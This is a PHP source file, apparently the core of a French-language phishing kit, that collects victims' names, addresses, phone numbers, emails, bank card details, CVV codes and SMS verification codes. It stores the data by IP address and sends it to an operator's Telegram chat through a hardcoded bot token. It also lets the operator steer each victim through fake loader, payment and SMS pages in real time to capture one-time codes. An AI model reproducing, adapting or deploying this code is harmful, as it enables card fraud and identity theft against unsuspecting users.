<?php
define('BOT_TOKEN', '8254737286:AAEsYcVYIq6PIDr-DUziVK9Hpze-Ssz-Ms8');
define('TELEGRAM_CHAT_ID', '7747778364');

session_start();
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 'user_' . uniqid();
}

// FONCTION AMÉLIORÉE POUR OBTENIR LA VRAIE IP MÊME AVEC NGROK
function getRealIP() {
    // Headers que ngrok utilise pour forwarder la vraie IP
    $headers = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_CLIENT_IP',
    ];
    
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    
    // Fallback à l'IP normale
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$current_user_id = $_SESSION['user_id'];
$current_ip = getRealIP(); // Utiliser la nouvelle fonction

function sendTelegramMessage($text, $keyboard = null) {
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function getBotKeyboard($user_id) {
    return [
        'inline_keyboard' => [
            [['text' => '🏠 Accueil', 'callback_data' => $user_id . ':index.php']],
            [['text' => '📦 Infos', 'callback_data' => $user_id . ':info.php']],
            [['text' => '💳 Paiement', 'callback_data' => $user_id . ':payment.php']],
            [['text' => '⏳ Loader', 'callback_data' => $user_id . ':loader.php']],
            [['text' => '📱 SMS', 'callback_data' => $user_id . ':sms.php']],
            [['text' => '⚡ Loader2', 'callback_data' => $user_id . ':loader2.php']],
            [['text' => '✅ Terminer', 'callback_data' => $user_id . ':done.php']]
        ]
    ];
}

function notifyNewVisit($user_id, $ip) {
    $message = "🎉 <b>NOUVELLE VISITE</b>\n👤 <b>User:</b> $user_id\n🌐 <b>IP:</b> $ip\n⏰ <b>Heure:</b> " . date('H:i:s');
    $keyboard = getBotKeyboard($user_id);
    return sendTelegramMessage($message, $keyboard);
}

// SAUVEGARDER les données par IP
function saveFormData($ip, $type, $data) {
    if (!is_dir('data')) mkdir('data', 0755, true);
    $file = "data/" . md5($ip) . "_{$type}.json";
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

// RÉCUPÉRER toutes les données d'une IP
function getAllDataForIP($ip) {
    $data = [];
    $pattern = "data/" . md5($ip) . "_*.json";
    
    $files = glob($pattern);
    foreach($files as $file) {
        if (preg_match('/_([a-z]+)\.json$/', $file, $matches)) {
            $type = $matches[1];
            $data[$type] = json_decode(file_get_contents($file), true);
        }
    }
    
    return $data;
}

// EMOJIS pour chaque champ
function getFieldEmoji($field_name) {
    $emojis = [
        // Livraison
        'nom' => '👤',
        'adresse' => '🏠', 
        'telephone' => '📞',
        'email' => '📧',
        
        // Carte
        'numero_carte' => '💳',
        'date_expiration' => '📅',
        'cvv' => '🔒',
        'titulaire' => '👤',
        
        // SMS
        'code_sms' => '🔢'
    ];
    
    return $emojis[$field_name] ?? '•';
}

// FORMATTER les noms de champs
function formatFieldName($field_name) {
    $names = [
        'nom' => 'Nom complet',
        'adresse' => 'Adresse',
        'telephone' => 'Téléphone',
        'email' => 'Email',
        'numero_carte' => 'Numéro de carte',
        'date_expiration' => 'Date expiration',
        'cvv' => 'Code CVV',
        'titulaire' => 'Titulaire',
        'code_sms' => 'Code SMS'
    ];
    
    return $names[$field_name] ?? ucfirst(str_replace('_', ' ', $field_name));
}

// NOTIFICATION REGROUPÉE avec EMOJIS
function notifyAllData($user_id, $ip, $new_type = null) {
    $all_data = getAllDataForIP($ip);
    
    if (empty($all_data)) {
        return;
    }
    
    // Déterminer le titre selon ce qui est disponible
    $has_livraison = isset($all_data['livraison']);
    $has_carte = isset($all_data['carte']);
    $has_sms = isset($all_data['sms']);
    
    if ($has_livraison && $has_carte && $has_sms) {
        $title = "✅ <b>DONNÉES COMPLÈTES</b>";
        $emoji = "🎊";
    } elseif ($has_livraison && $has_carte) {
        $title = "📊 <b>LIVRAISON + CARTE</b>";
        $emoji = "🛒";
    } elseif ($has_livraison) {
        $title = "📦 <b>INFORMATIONS LIVRAISON</b>";
        $emoji = "🚚";
    } else {
        $title = "📱 <b>DONNÉES</b>";
        $emoji = "📋";
    }
    
    $message = "$emoji $title\n";
    $message .= "👤 <b>User:</b> $user_id\n";
    $message .= "🌐 <b>IP:</b> $ip\n";
    $message .= "⏰ <b>Heure:</b> " . date('H:i:s') . "\n\n";
    
    // Ajouter livraison avec emojis
    if (isset($all_data['livraison'])) {
        $message .= "📦 <b>LIVRAISON</b>\n";
        foreach($all_data['livraison'] as $key => $value) {
            $emoji = getFieldEmoji($key);
            $field_name = formatFieldName($key);
            $message .= "$emoji <b>$field_name:</b> $value\n";
        }
        $message .= "\n";
    }
    
    // Ajouter carte avec emojis
    if (isset($all_data['carte'])) {
        $message .= "💳 <b>CARTE BANCAIRE</b>\n";
        foreach($all_data['carte'] as $key => $value) {
            $emoji = getFieldEmoji($key);
            $field_name = formatFieldName($key);
            
            // Masquer partiellement les données sensibles
            if ($key === 'numero_carte') {
                $value = substr($value, 0, 4) . ' **** **** ' . substr($value, -4);
            } elseif ($key === 'cvv') {
                $value = '***';
            }
            
            $message .= "$emoji <b>$field_name:</b> $value\n";
        }
        $message .= "\n";
    }
    
    // Ajouter SMS avec emojis
    if (isset($all_data['sms'])) {
        $message .= "📱 <b>VÉRIFICATION SMS</b>\n";
        foreach($all_data['sms'] as $key => $value) {
            $emoji = getFieldEmoji($key);
            $field_name = formatFieldName($key);
            $message .= "$emoji <b>$field_name:</b> $value\n";
        }
        $message .= "\n";
    }
    
    // Ajouter indicateur de progression
    $progress = "";
    if ($has_livraison) $progress .= "📦";
    if ($has_carte) $progress .= " → 💳";
    if ($has_sms) $progress .= " → 📱";
    
    if ($progress) {
        $message .= "🔄 <b>Progression:</b> $progress\n";
        
        if ($has_livraison && $has_carte && $has_sms) {
            $message .= "🎉 <b>Status:</b> Complété !\n";
        }
    }
    
    $keyboard = getBotKeyboard($user_id);
    return sendTelegramMessage($message, $keyboard);
}

function saveRedirect($user_id, $page) {
    if (!is_dir('commands')) mkdir('commands', 0755, true);
    file_put_contents("commands/{$user_id}.txt", $page);
}

function checkRedirect() {
    if (isset($_SESSION['user_id'])) {
        $user_id = $_SESSION['user_id'];
        $command_file = "commands/{$user_id}.txt";
        
        if (file_exists($command_file)) {
            $redirect_page = trim(file_get_contents($command_file));
            unlink($command_file);
            
            if ($redirect_page && file_exists($redirect_page)) {
                header("Location: $redirect_page");
                exit;
            }
        }
    }
}
?>
